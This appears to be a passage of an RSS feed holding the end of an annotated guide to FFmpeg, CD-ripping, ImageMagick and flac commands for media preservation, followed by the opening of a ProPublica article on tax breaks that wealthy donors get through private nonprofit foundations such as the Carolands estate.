    <!-- Generate Video Fingerprint -->
    <p><label for="generate_video_fingerprint">Generate Video Fingerprint</label>
    </p><div>
      <h5>Generate a perceptual hash for an input video file</h5>
      <p><code>ffmpeg -i <em>input</em> -vf signature=format=xml:filename="output.xml" -an -f null -</code></p>
      <dl>
        <dt>ffmpeg -i <em>input</em></dt><dd>starts the command using your input file</dd>
        <dt>-vf signature=format=xml</dt><dd>applies the signature filter to the input file and sets the output format for the fingerprint to xml</dd>
        <dt>filename="output.xml"</dt><dd>sets the output for the signature filter</dd>
        <dt>-an</dt><dd>tells FFmpeg to ignore the audio stream of the input file</dd>
        <dt>-f null -</dt><dd>Sets the FFmpeg output to a null stream (since we are only interested in the output generated by the filter).</dd>
      </dl>
      
    </div>
    <!-- ends Generate Video Fingerprint -->

    </div>
    <div>
      <h2 id="other">Other</h2>

      <!-- Play image sequence -->
      <p><label for="play_im_seq">Play an image sequence</label>
      </p><div>
        <h5>Play an image sequence</h5>
        <p>Play an image sequence directly as moving images, without having to create a video first.</p>
        <p><code>ffplay -framerate 5 <em>input_file_%06d.ext</em></code></p>
        <dl>
          <dt>ffplay</dt><dd>starts the command</dd>
          <dt>-framerate 5</dt><dd>plays image sequence at rate of 5 images per second<br>
          <strong>Note:</strong> this low framerate will produce a slideshow effect.</dd>
          <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file<br>
          This must match the naming convention used! The regex %06d matches six-digit-long numbers, possibly with leading zeroes. This allows the full sequence to be read in ascending order, one image after the other.<br>
          The extension for TIFF files is .tif or maybe .tiff; the extension for DPX files is .dpx (or even .cin for old files). Screenshots are often in .png format.</dd>
        </dl>
        <p><strong>Notes:</strong></p>
        <p>If <code>-framerate</code> is omitted, the playback speed depends on the images’ file sizes and on the computer’s processing power. It may be rather slow for large image files.</p>
        <p>You can navigate durationally by clicking within the playback window. Clicking towards the left-hand side of the playback window takes you towards the beginning of the playback sequence; clicking towards the right takes you towards the end of the sequence.</p>
        
      </div>
      <!-- ends Play image sequence -->

      <!-- Split audio and video tracks -->
      <p><label for="split_audio_video">Split audio and video tracks</label>
      </p><div>
        <h5>Split audio and video tracks</h5>
        <p><code>ffmpeg -i <em>input_file</em> -map 0:v:0 <em>video_output_file</em> -map 0:a:0 <em>audio_output_file</em></code></p>
        <p>This command splits the original input file into a video and audio stream. The -map command identifies which streams are mapped to which file. To ensure that you’re mapping the right streams to the right file, run ffprobe before writing the script to identify which streams are desired.</p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
          <dt>-map 0:v:0</dt><dd>grabs the first video stream and maps it into:</dd>
          <dt><em>video_output_file</em></dt><dd>path, name and extension of the video output file</dd>
          <dt>-map 0:a:0</dt><dd>grabs the first audio stream and maps it into:</dd>
          <dt><em>audio_output_file</em></dt><dd>path, name and extension of the audio output file</dd>
        </dl>
        
      </div>
      <!-- ends Split audio and video tracks -->

      <!-- Merge audio and video tracks -->
      <p><label for="merge_audio_video">Merge audio and video tracks</label>
      </p><div>
        <h3>Merge audio and video tracks</h3>
        <p><code>ffmpeg -i <em>video_file</em> -i <em>audio_file</em> -map 0:v -map 1:a -c copy <em>output_file</em></code></p>
        <p>This command takes a video file and an audio file as inputs, and creates an output file that combines the video stream in the first file with the audio stream in the second file.</p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>video_file</em></dt><dd>path, name and extension of the first input file (the video file)</dd>
          <dt>-i <em>audio_file</em></dt><dd>path, name and extension of the second input file (the audio file)</dd>
          <dt>-map <em>0:v</em></dt><dd>selects the video streams from the first input file</dd>
          <dt>-map <em>1:a</em></dt><dd>selects the audio streams from the second input file</dd>
          <dt>-c copy</dt><dd>copies streams without re-encoding</dd>
          <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
        </dl>
        <p><strong>Note:</strong> in the example above, the video input file is given prior to the audio input file. However, input files can be added any order, as long as they are indexed correctly when stream mapping with <code>-map</code>. See the entry on <a href="#stream-mapping">stream mapping</a>.</p>
        <h4>Variation:</h4>
        <p>Include the audio tracks from both input files with the following command:</p>
        <p><code>ffmpeg -i <em>video_file</em> -i <em>audio_file</em> -map 0:v -map 0:a -map 1:a -c copy <em>output_file</em></code></p>
        
      </div>
      <!-- ends Merge audio and video tracks -->

      <!-- Create ISO -->
      <p><label for="create_iso">Create ISO files for DVD access</label>
      </p><div>
        <h5>Create ISO files for DVD access</h5>
        <p>Create an ISO file that can be used to burn a DVD. Please note, you will have to install dvdauthor. To install dvd author using Homebrew run: <code>brew install dvdauthor</code></p>
        <p><code>ffmpeg -i <em>input_file</em> -aspect <em>4:3</em> -target ntsc-dvd <em>output_file</em>.mpg</code></p>
        <p>This command will take any file and create an MPEG file that dvdauthor can use to create an ISO.</p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
          <dt>-aspect 4:3</dt><dd>declares the aspect ratio of the resulting video file. You can also use 16:9.</dd>
          <dt>-target ntsc-dvd</dt><dd>specifies the region for your DVD. This could be also pal-dvd.</dd>
          <dt><em>output_file</em>.mpg</dt><dd>path and name of the output file. The extension must be <code>.mpg</code></dd>
        </dl>
        
      </div>
      <!-- ends Create ISO -->

      <!-- Scene Detection using YDIF -->
      <p><label for="csv-ydif">CSV with timecodes and YDIF</label>
      </p><div>
        <h5>Exports CSV for scene detection using YDIF</h5>
        <p><code>ffprobe -f lavfi -i movie=<em>input_file</em>,signalstats -show_entries frame=pkt_pts_time:frame_tags=lavfi.signalstats.YDIF -of csv</code></p>
        <p>This ffprobe command prints a CSV correlating timestamps and their YDIF values, useful for determining cuts.</p>
        <dl>
          <dt>ffprobe</dt><dd>starts the command</dd>
          <dt>-f lavfi</dt><dd>uses the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter input virtual device</a> as chosen format</dd>
          <dt>-i movie=<em>input file</em></dt><dd>path, name and extension of the input video file</dd>
          <dt>,</dt><dd>comma signifies closing of video source assertion and ready for filter assertion</dd>
          <dt>signalstats</dt><dd>tells ffprobe to use the signalstats command</dd>
          <dt>-show_entries</dt><dd>sets list of entries to show per column, determined on the next line</dd>
          <dt>frame=pkt_pts_time:frame_tags=lavfi.signalstats.YDIF</dt><dd>specifies showing the timecode (<code>pkt_pts_time</code>) in the frame stream and the YDIF section of the frame_tags stream</dd>
          <dt>-of csv</dt><dd>sets the output printing format to CSV. <code>-of</code> is an alias of <code>-print_format</code>.</dd>
        </dl>
        
      </div>
      <!-- ends sample Scene Detection using YDIF -->

      <!-- Cover head switching noise -->
      <p><label for="cover_head">Cover head switching noise</label>
      </p><div>
        <h5>Cover head switching noise</h5>
        <p><code>ffmpeg -i <em>input_file</em> -filter:v drawbox=w=iw:h=7:y=ih-h:t=max <em>output_file</em></code></p>
        <p>This command will draw a black box over a small area of the bottom of the frame, which can be used to cover up head switching noise.</p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
          <dt>-filter:v drawbox=</dt>
          <dd>This calls the drawtext filter with the following options:
            <dl>
              <dt>w=in_w</dt><dd>Width is set to the input width. Shorthand for this command would be w=iw</dd>
              <dt>h=7</dt><dd>Height is set to 7 pixels.</dd>
              <dt>y=ih-h</dt><dd>Y represents the offset, and ih-h sets it to the input height minus the height declared in the previous parameter, setting the box at the bottom of the frame.</dd>
              <dt>t=max</dt><dd>T represents the thickness of the drawn box. Default is 3.</dd>
            </dl>
          </dd>
          <dt><em>output_file</em></dt><dd>path and name of the output file</dd>
        </dl>
        
      </div>
      <!-- ends Cover head switching noise -->

      <!-- Record and live-stream simultaneously -->
      <p><label for="record-and-stream">Record and live-stream simultaneously</label>
      </p><div>
        <h5>Record and live-stream simultaneously</h5>
        <p><code>ffmpeg -re -i <em>${INPUTFILE}</em> -map 0 -flags +global_header -vf scale="1280:-1,format=yuv420p" -pix_fmt yuv420p -level 3.1 -vsync passthrough -crf 26 -g 50 -bufsize 3500k -maxrate 1800k -c:v libx264 -c:a aac -b:a 128000 -r:a 44100 -ac 2 -t ${STREAMDURATION} -f tee <em>"[movflags=+faststart]${TARGETFILE}|[f=flv]${STREAMTARGET}"</em></code></p>
        <p>I use this script to stream to a RTMP target and record the stream locally as .mp4 with only one ffmpeg-instance.</p>
        <p>As input, I use <code>bmdcapture</code> which is piped to ffmpeg. But it can also be used with a static videofile as input.</p>
        <p>The input will be scaled to 1280px width, maintaining height. Also the stream will stop after a given time (see <code>-t</code> option.)</p>
        <h4>Notes</h4>
        <ol>
          <li>I recommend to use this inside a shell script - then you can define the variables <code>${INPUTFILE}</code>, <code>${STREAMDURATION}</code>, <code>${TARGETFILE}</code>, and <code>${STREAMTARGET}</code>.</li>
          <li>This is in daily use to live-stream a real-world TV show. No errors for nearly 4 years. Some parameters were found by trial-and-error or empiric testing. So suggestions/questions are welcome.</li>
        </ol>
        <dl>
           <dt>ffmpeg</dt><dd>starts the command</dd>
           <dt>-re</dt><dd>Read input at native framerate</dd>
           <dt>-i input.mov</dt><dd>The input file. Can also be a <code>-</code> to use STDIN if you pipe in from webcam or SDI.</dd>
           <dt>-map 0</dt><dd>map ALL streams from input file to output</dd>
           <dt>-flags +global_header</dt><dd>Don't place extra data in every keyframe</dd>
           <dt>-vf scale="1280:-1"</dt><dd>Scale to 1280 width, maintain aspect ratio.</dd>
           <dt>-pix_fmt yuv420p</dt><dd>convert to 4:2:0 chroma subsampling scheme</dd>
           <dt>-level 3.1</dt><dd>H.264 Level (defines some thresholds for bitrate)</dd>
           <dt>-vsync passthrough</dt><dd>Each frame is passed with its timestamp from the demuxer to the muxer.</dd>
           <dt>-crf 26</dt><dd>Constant rate factor - basically the quality</dd>
           <dt>-g 50</dt><dd>GOP size.</dd>
           <dt>-bufsize 3500k</dt><dd>Ratecontrol buffer size (~ maxrate x2)</dd>
           <dt>-maxrate 1800k</dt><dd>Maximum bit rate</dd>
           <dt>-c:v libx264</dt><dd>encode output video stream as H.264</dd>
           <dt>-c:a aac</dt><dd>encode output audio stream as AAC</dd>
           <dt>-b:a 128000</dt><dd>The audio bitrate</dd>
           <dt>-r:a 44100</dt><dd>The audio samplerate</dd>
           <dt>-ac 2</dt><dd>Two audio channels</dd>
           <dt>-t ${STREAMDURATION}</dt><dd>Time (in seconds) after which the stream should automatically end.</dd>
           <dt>-f tee</dt><dd>Use multiple outputs. Outputs defined below.</dd>
           <dt>"[movflags=+faststart]target-file.mp4|[f=flv]rtmp://stream-url/stream-id"</dt><dd>The outputs, separated by a pipe (|). The first is the local file, the second is the live stream. Options for each target are given in square brackets before the target.</dd>
        </dl>
        
      </div>
      <!-- END Record and live-stream at the same time -->

      <!-- View Subprogram Info -->
      <p><label for="view_subprogram_info">View FFmpeg subprogram information</label>
      </p><div>
        <h5>View information about a specific decoder, encoder, demuxer, muxer, or filter</h5>
        <p><code>ffmpeg -h <em>type=name</em></code></p>
        <dl>
          <dt>ffmpeg</dt><dd>starts the command</dd>
          <dt>-h</dt><dd>Call the help option</dd>
          <dt>type=name</dt>
          <dd>tells FFmpeg which kind of option you want, for example:
            <ul>
              <li><code>encoder=libx264</code></li>
              <li><code>decoder=mp3</code></li>
              <li><code>muxer=matroska</code></li>
              <li><code>demuxer=mov</code></li>
              <li><code>filter=crop</code></li>
            </ul>
          </dd>
        </dl>
        
      </div>
      <!-- ends View Subprogram info -->
    </div>

    <div>
      
      <p>This section introduces and explains the usage of some additional command line tools similar to FFmpeg for use in digital preservation workflows (and beyond!).</p>
    </div>

    <div>
      <h2 id="cdda">CDDA (Audio CD) Ripping Tools</h2>
      <!-- Find Drive Offset for Exact CD Ripping -->
      <p><label for="find-offset">Find Drive Offset for Exact CD Ripping</label>
      </p><div>
        <h5>Find Drive Offset for Exact CD Ripping</h5>
        <p>If you want to make CD rips that can be verified via checksums to other rips of the same content, you need to know the offset of your CD drive. Put simply, different models of CD drives have different offsets, meaning they start reading in slightly different locations. This must be compensated for in order for files created on different (model) drives to generate the same checksum. For a more detailed explanation of drive offsets see the explanation <a href="https://dbpoweramp.com/spoons-audio-guide-cd-ripping.htm" target="_blank">here.</a> In order to find your drive offset, first you will need to know exactly what model your drive is, then you can look it up in the list of drive offsets by Accurate Rip.</p>
        <p>Often it can be difficult to tell what model your drive is simply by looking at it - it may be housed inside your computer or have external branding that is different from the actual drive manufacturer. For this reason, it can be useful to query your drive with CD ripping software in order to ID it. The following commands should give you a better idea of what drive you have.</p>
        <p><strong>Cdda2wav:</strong> <code>cdda2wav -scanbus</code> or simply <code>cdda2wav</code></p>
        <p><strong>CD Paranoia:</strong> <code>cdparanoia -vsQ</code></p>
        <p>Once you have IDed your drive, you can search the <a href="http://www.accuraterip.com/driveoffsets.htm">Accurate Rip CD drive offset list</a> to find the correct offset for your drive as sourced by the community.</p>
        <p><strong>Note:</strong> A very effective GUI based tool (macOS specific) for both for discovering drive offset as well as accurately ripping CDDAs is <a href="https://tmkk.undo.jp/xld/index_e.html">XLD</a>. Instructions for calibrating XLD can be found at <a href="https://wiki.hydrogenaud.io/index.php?title=XLD_Configuration">this page</a>.</p>
        
      </div>
      <!-- Find Drive Offset for Exact CD Ripping -->

      <!-- Rip with CD Paranoia -->
        <p><label for="cdparanoia">Rip a CD with CD Paranoia</label>
        </p><div>
          <h5>Rip a CD with CD Paranoia</h5>
          <p><code>cdparanoia -L -B -O <em>[Drive Offset]</em> <em>[Starting Track Number]</em>-<em>[Ending Track Number]</em> <em>output_file.wav</em></code></p>
          <p>This command will use CD Paranoia to rip a CD into separate tracks while compensating for the sample offset of the CD drive. (For more information about drive offset see <a href="#find-offset">the related ffmprovisr command.</a>)</p>
          <dl>
            <dt>cdparanoia</dt><dd>begins the cdparanoia command.</dd>
            <dt>-L</dt><dd>creates verbose logfile.</dd>
            <dt>-B</dt><dd>puts CD Paranoia into 'batch' mode, which will automatically split tracks into separate files.</dd>
            <dt>-O [Drive Offset]</dt><dd>allows you to specify the sample offset of your drive. Skip this flag to rip without offset correction.</dd>
            <dt>[Starting Track Number]-[Ending Track Number]</dt><dd>specifies which tracks to write. For example <code>1-4</code> would rip tracks one through four.</dd>
            <dt><em>output_file.wav</em></dt><dd>the desired name for your output file(s) (for example the CD name). CD Paranoia will prepend this with track numbers.</dd>
          </dl>
          
        </div>
      <!-- ends Rip with CD Paranoia -->

      <!-- Rip with CDDA2WAV -->
      <p><label for="cdda2wav">Rip a CD with Cdda2wav</label>
      </p><div>
        <h5>Rip a CD with Cdda2wav</h5>
        <p><code>cdda2wav -L0 -t all -cuefile -paranoia paraopts=retries=200,readahead=600,minoverlap=sectors-per-request-1 -verbose-level all <em>output.wav</em></code></p>
        <p>Cdda2wav is a tool that uses the <a href="https://www.xiph.org/paranoia/">Paranoia library</a> to facilitate accurate ripping of audio CDs (CDDA). It can be installed via Homebrew with the command <code> brew install cdrtools</code>. This command will accurately rip an audio CD into a single wave file, while querying the CDDB database for track information and creating a cue sheet. This cue sheet can then be used either for playback of the WAV file or to split it into individual access files. Any <a href="https://en.wikipedia.org/wiki/CD-Text">cdtext</a> information that is discovered will be stored as a sidecar. For more information about cue sheets see <a href="https://en.wikipedia.org/wiki/Cue_sheet_(computing)">this Wikipedia article.</a></p>
        <p><strong>Notes: </strong>On macOS the CD must be unmounted before this command is run. This can be done with the command <code>sudo umount '/Volumes/Name_of_CD'</code></p>
        <p>As of writing, when using the default Homebrew installed version of Cdda2wav some drives will falsely report errors on all rips. If this is occurring, a possible solution is to use the command <code>brew install --devel cdrtools</code> to install a more recent build that incorporates a fix.</p>
        <dl>
          <dt>cdda2wav</dt><dd>begins the Cdda2wav command</dd>
          <dt>-L0</dt><dd>tells Cdda2wav to query the CDDB database for track name information. L0 is 'interactive mode' meaning Cdda2wav will ask you to confirm choices in the event of multiple matches. Change this to <code>-L1</code> to automatically select the first database match.</dd>
          <dt>-t all</dt><dd>tells Cdda2wav to rip the entire CD to one file</dd>
          <dt>-cuefile</dt><dd>tells Cdda2wav to create a cue file of CD contents</dd>
          <dt>-paranoia</dt><dd>enables the Paranoia library for ripping</dd>
          <dt>paraopts=retries=200,readahead=600,minoverlap=sectors-per-request-1</dt><dd>configures ripping to a generically conservative setting for retries and caching. These values were taken from the Cdda2wav man file and can be changed depending on needs, such as for more/less retry attempts. For more information see the Cdda2wav man file (also available online <a href="https://linux.die.net/man/1/cdda2wav">here)</a>.</dd>
          <dt>-verbose-level all</dt><dd>sets terminal information to the most verbose view</dd>
          <dt><em>output.wav</em></dt><dd>the desired name for your output file (for example the CD name).</dd>
        </dl>
        
      </div>
      <!-- ends Rip with CDDA2WAV -->

      <!-- Check for CD Emphasis -->
        <p><label for="cd-emph-check">Check/Compensate for CD Emphasis</label>
        </p><div>
          <h5>Check/Compensate for CD Emphasis</h5>
          <p>While somewhat rare, certain CDs had 'emphasis' applied as a form of noise reduction. This seems to mostly affect early (1980s) era CDs and some CDs pressed in Japan. Emphasis is part of the <a href="https://en.wikipedia.org/wiki/Compact_Disc_Digital_Audio#Standard">Red Book standard</a> and, if present, must be compensated for to ensure accurate playback. CDs that use emphasis contain flags on tracks that tell the CD player to de-emphasize the audio on playback. When ripping a CD with emphasis, it is important to take this into account and either apply de-emphasis while ripping, or if storing a 'flat' copy, create another de-emphasized listening copy.</p>
          <p>The following commands will output information about the presence of emphasis when run on a target CD:</p>
          <p><strong>Cdda2wav:</strong> <code>cdda2wav -J</code></p>
          <p><strong>CD Paranoia:</strong> <code>cdparanoia -Q</code></p>
          <p>In order to compensate for emphasis during ripping while using Cdda2wav, the <code>-T</code> flag can be added to the <a href="#cdda2wav">standard ripping command</a>. For a recipe to compensate for a flat rip, see the section on <a href="#cd_eq">de-emphasizing with FFmpeg</a>.
          </p>
        </div>
      <!-- Check for CD Emphasis -->
    </div>
    <!-- ends CDDA Tools -->

    <div>
      <h2 id="imagemagick">ImageMagick</h2>

      <!-- About ImageMagick -->
      <p><label for="im-basics">About ImageMagick</label>
      </p><div>
        <h5>About ImageMagick</h5>
        <p>ImageMagick is a free and open-source software suite for displaying, converting, and editing raster image and vector image files.</p>
        <p>It's official website can be found <a href="https://www.imagemagick.org/script/index.php" target="_blank">here</a>.</p>
        <p>Another great resource with lots of supplemental explanations of filters is available at <a href="http://www.fmwconcepts.com/imagemagick/index.php" target="_blank">Fred's ImageMagick Scripts</a>.</p>
        <p>Unlike many other command line tools, ImageMagick isn't summoned by calling its name. Rather, ImageMagick installs links to several more specific commands: <code>convert</code>, <code>montage</code>, and <code>mogrify</code>, to name a few.</p>
        
      </div>
      <!-- End About ImageMagick -->

      <!-- Compare two images -->
      <p><label for="im_compare">Compare two images</label>
      </p><div>
        <h5>Compare two images</h5>
        <p><code>compare -metric ae <em>image1.ext image2.ext</em> null:</code></p>
        <p>Compares two images to each other.</p>
        <dl>
          <dt>compare</dt><dd>starts the command</dd>
          <dt>-metric ae</dt><dd>applies the absolute error count metric, returning the number of different pixels. <a href="https://www.imagemagick.org/script/command-line-options.php#metric" target="_blank">Other parameters</a> are available for image comparison.</dd>
          <dt><em>image1.ext image2.ext</em></dt><dd>takes two images as input</dd>
          <dt>null:</dt><dd>throws away the comparison image that would be generated</dd>
        </dl>
        
      </div>
      <!-- ends Compare two images -->

      <!-- Create thumbnails -->
      <p><label for="im_thumbs">Create thumbnails of images</label>
      </p><div>
        <h5>Create thumbnails</h5>
        <p>Creates thumbnails for all files in a folder and saves them in that folder.</p>
        <p><code>mogrify -resize 80x80 -format jpg -quality 75 -path thumbs *.jpg</code></p>
        <dl>
          <dt>montage</dt><dd>starts the command</dd>
          <dt>-resize 80x80</dt><dd>resizes copies of original images to 80x80 pixels</dd>
          <dt>-format jpg</dt><dd>reformats original images to jpg</dd>
          <dt>-quality 75</dt><dd>sets quality to 75 (out of 100), adding light compression to smaller files</dd>
          <dt>-path thumbs</dt><dd>specifies where to save the thumbnails -- this goes to a folder within the active folder called "thumbs".<br>
          Note: You will have to make this folder if it doesn't already exist.</dd>
          <dt><em>*.jpg</em></dt><dd>The asterisk acts as a "wildcard" to be applied to every file in the directory.</dd>
        </dl>
        
      </div>
      <!-- ends Create thumbnails -->

      <!-- Create grid of images -->
      <p><label for="im_grid">Creates grid of images from text file</label>
      </p><div>
        <h3>Create grid of images</h3>
        <p><code>montage @<em>list.txt</em> -tile 6x12 -geometry +0+0 <em>output_grid.jpg</em></code></p>
        <dl>
          <dt>montage</dt><dd>starts the command</dd>
          <dt>@list.txt</dt><dd>path and name of a text file containing a list of filenames, one per each line</dd>
          <dt>-tile 6x12</dt><dd>specifies the dimensions of the proposed grid (6 images wide, 12 images long)</dd>
          <dt>-geometry +0+0</dt><dd>specifies to include no spacing around any of the tiles; they will be flush against each other</dd>
          <dt><em>output_grid.jpg</em></dt><dd>path and name of the output file</dd>
        </dl>
        
      </div>
      <!-- ends Create grid of images -->

      <!-- Get file signature data -->
      <p><label for="im_sig_data">Get file signature data</label>
      </p><div>
        <h5>Get file signature data</h5>
        <p><code>convert -verbose <em>input_file.ext</em> | grep -i signature </code></p>
        <p>Gets signature data from an image file, which is a hash that can be used to uniquely identify the image.</p>
        <dl>
          <dt>convert</dt><dd>starts the command</dd>
          <dt>-verbose</dt><dd>sets verbose flag for collecting the most data</dd>
          <dt><em>input_file.ext</em></dt><dd>path and name of image file</dd>
          <dt>|</dt><dd>pipe the data into something else</dd>
          <dt>grep</dt><dd>starts the grep command</dd>
          <dt>-i signature</dt><dd>ignore case and search for the phrase "signature"</dd>
        </dl>
        
      </div>
      <!-- ends Get file signature data -->

      <!-- Remove exif data -->
      <p><label for="im_strip">Removes exif metadata</label>
      </p><div>
        <h5>Remove exif data</h5>
        <p><code>mogrify -path ./stripped/ -strip *.jpg</code></p>
        <p>Removes (strips) exif data and moves clean files to a new folder.</p>
        <dl>
          <dt>mogrify</dt><dd>starts the command</dd>
          <dt>-path ./stripped/</dt><dd>sets directory within current directory called "stripped"</dd>
          <dt>-strip</dt><dd>removes exif metadata</dd>
          <dt>*.jpg</dt><dd>applies command to all .jpgs in current folder</dd>
        </dl>
        
      </div>
      <!-- ends Remove exif data -->

      <!-- Resize to width -->
      <p><label for="im_resize">Resizes image to specific pixel width</label>
      </p><div>
        <h5>Resize to width</h5>
        <p><code>convert <em>input_file.ext</em> -resize 750 <em>output_file.ext</em></code></p>
        <p>This script will also convert the file format, if the output has a different file extension than the input.</p>
        <dl>
          <dt>convert</dt><dd>starts the command</dd>
          <dt>-i <em>input_file.ext</em></dt><dd>path and name of the input file</dd>
          <dt>-resize 750</dt><dd>resizes the image to 750 pixels wide, retaining aspect ratio</dd>
          <dt><em>output_file.ext</em></dt><dd>path and name of the output file</dd>
        </dl>
        
      </div>
      <!-- ends Resize to width -->
    </div>
    <div>
      <h2 id="flac">flac</h2>
      <!-- flac tool -->
      <p><label for="flac-tool">Transcoding to/from FLAC</label>
      </p><div>
        <h5>About flac tool</h5>
        <p>The flac tool is the tool created by the FLAC project to transcode to/from FLAC and to manipulate metadata in FLAC files. One advantage it has over other tools used to transcode into FLAC is the capability of embedding foreign metadata (such as BWF metadata). This means that it is possible to compress a BWF file into FLAC and maintain the ability to transcode back into an identical BWF, metadata and all. For a more detailed explanation, see <a href="http://dericed.com/2013/flac-in-the-archives/" target="_blank">Dave Rice's article</a> on the topic, from which the following commands are adapted.</p>
        <h3>Transcode to FLAC</h3>
        <p>Use this command to transcode from WAV to FLAC while maintaining BWF metadata</p>
        <p><code>flac --best --keep-foreign-metadata --preserve-modtime --verify <em>input.wav</em></code></p>
        <dl>
          <dt>flac</dt><dd>starts the command</dd>
          <dt>-i <em>input_file.ext</em></dt><dd>path and name of the input file</dd>
          <dt>--best</dt><dd>sets the file for the most efficient compression (resulting in a smaller file at the expense of a slower process).</dd>
          <dt>--keep-foreign-metadata</dt><dd>tells the flac tool to maintain original metadata within the FLAC file.</dd>
          <dt>--preserve-modtime</dt><dd>preserves the file timestamps of the input file.</dd>
          <dt>--verify</dt><dd>verifies the validity of the output file.</dd>
        </dl>
        <h3>Transcode from FLAC</h3>
        <p>Use this command to transcode from FLAC to reconstruct original BWF file. Command is the same as the prior command with the exception of substituting <code>--decode</code> for <code>best</code> and changing the input to a <code>.flac</code> file.</p>
        <p><code>flac --decode --keep-foreign-metadata --preserve-modtime --verify <em>input.flac</em></code></p>
        
      </div>
    </div>
    <!-- End About flac -->
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How the Rich Reap Huge Tax Breaks From Private Nonprofits (282 pts)]]></title>
            <link>https://www.propublica.org/article/how-private-nonprofits-ultrawealthy-tax-deductions-museums-foundation-art</link>
            <guid>36929335</guid>
            <pubDate>Sun, 30 Jul 2023 09:14:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.propublica.org/article/how-private-nonprofits-ultrawealthy-tax-deductions-museums-foundation-art">https://www.propublica.org/article/how-private-nonprofits-ultrawealthy-tax-deductions-museums-foundation-art</a>, See on <a href="https://news.ycombinator.com/item?id=36929335">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-pp-location="article body">

                    <a href="https://www.propublica.org/series/the-secret-irs-files">
                                                        

                    <img width="400" height="267" sizes="(min-width: 1520px) 257px, (min-width: 1260px) calc(20vw - 10px), (min-width: 960px) calc(20vw - 50px), (min-width: 780px) calc(25vw - 40px), 96px" alt="" srcset="https://img.assets-c3.propublica.org/images/series/series-3x2.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=133&amp;q=75&amp;w=200&amp;s=f7f84662589016263acf56bb7d4a7d56 200w, https://img.assets-c3.propublica.org/images/series/series-3x2.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=267&amp;q=75&amp;w=400&amp;s=d49a219703a3db1bf64aa501170d3481 400w, https://img.assets-c3.propublica.org/images/series/series-3x2.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=400&amp;q=75&amp;w=600&amp;s=591a47372f5143f8e18a218b59a8f9ab 600w" loading="lazy">
                                
            </a>
        
                    <div data-pp-location="top-note">
                

                                                
            <p>ProPublica is a nonprofit newsroom that investigates abuses of power. Sign up to receive <a href="https://www.propublica.org/newsletters/the-big-story?source=www.propublica.org&amp;placement=top-note&amp;region=national">our biggest stories</a> as soon as they’re published.</p>

                

            </div><!-- end .article-body__top-notes -->
        
        




                    
<p data-pp-blocktype="copy" data-pp-id="1.0">Once a week, a little past noon on Wednesdays, a line of cars forms outside the wrought-iron gates of the Carolands mansion, 20 miles south of downtown San Francisco. From the entrance, you can see the southeast facade of the 98-room Beaux Arts chateau, which was built a century ago by an heiress to the Pullman railroad-car fortune. Not visible from that vantage point is the stately reflecting pool, or the gardens, whose original designer took inspiration from Versailles.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="2.0">I was sitting just outside this splendor, idling in my rented Toyota Corolla, on a clear day last winter. Like the other people in the line of cars, I was about to enjoy a rare treat. Carolands is an architectural landmark, but it’s open only two hours a week. Would-be visitors apply a month in advance, hoping to win a lottery for tickets. Like most lotteries, this one has long odds. I had applied unsuccessfully for the three tours scheduled for February. Finally, I resorted to my journalist’s privilege: I emailed and called the director of the foundation that owns the estate, explaining that I was a reporter planning to be in the area for a few days. Could she help? Eventually, she called back and offered me a place on a tour.</p>
        
    
                        


   
            
            
            
            

   
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="4.0">It wasn’t supposed to be this difficult. When billionaire Charles Johnson sought a tax break in 2013 for donating his mansion to his private foundation, the organization assured the Internal Revenue Service and state officials that the public would be welcome. “The Foundation will fulfill its charitable and educational purpose by opening the Carolands Estate to the public,” it stated in its <a href="https://www.documentcloud.org/documents/23879863-carolands_1023_public#document/p16/a2365104">application for tax-exempt status</a>, which included a pamphlet for a self-guided tour. The foundation later told a California tax regulator that the estate was <a href="https://www.documentcloud.org/documents/23885843-carolands-california-boe-277-public#document/p38/a2365102">open to the public every weekday from 9-5</a>.</p>
        
    
                    

<figure data-pp-id="5" data-pp-blocktype="image">

    


                    
    


    <img alt="" width="3888" height="2592" loading="lazy" js-autosizes="" src="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=533&amp;q=75&amp;w=800&amp;s=dbed06995f98176aa5c769074bb133df" srcset="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=267&amp;q=75&amp;w=400&amp;s=3ee5b5d35884ae9d26fad20dd85e9e3a 400w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=533&amp;q=75&amp;w=800&amp;s=dbed06995f98176aa5c769074bb133df 800w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=800&amp;q=75&amp;w=1200&amp;s=9bc929473e42856a18c61d3a9dbcaf4a 1200w, 